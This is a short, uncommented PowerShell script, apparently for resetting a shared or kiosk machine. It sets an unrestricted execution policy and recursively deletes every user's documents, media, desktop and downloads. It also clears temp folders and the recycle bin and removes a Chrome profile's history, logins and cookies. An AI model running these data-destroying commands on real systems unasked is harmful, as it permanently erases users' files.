Set-ExecutionPolicy Unrestricted
ls -Recurse *.ps1 | Unblock-File
ls -Recurse *.psm1 | Unblock-File

Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Downloads) -Recurse} | %{Remove-Item $_.FullName -Verbose};
Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Documents) -Recurse} | %{Remove-Item $_.FullName -Verbose};
Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Music) -Recurse} | %{Remove-Item $_.FullName -Verbose};
Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Videos) -Recurse} | %{Remove-Item $_.FullName -Verbose};
Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Pictures) -Recurse} | %{Remove-Item $_.FullName -Verbose};
Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Desktop) -Recurse} | %{Remove-Item $_.FullName -Verbose};
 del C:\Windows\Temp\*.*;
 del "C:\ProgramData\Package Cache\*.*";
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\History" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Login Data" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Cookies" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Login Data For Account" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\LOG" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Preferences" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Network Action Predictor" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Shortcuts" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\LOG.old" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Top Sites" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\LOCK" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Favicons" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Trust Tokens" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Web Data" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Quota Manager" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Reporting and NEL" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\PreferedApps" ;
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\Visited Links" ;
 del C:\Users\mobile\AppData\Local\Temp\*.* 



 del 'C:\$Recycle.Bin';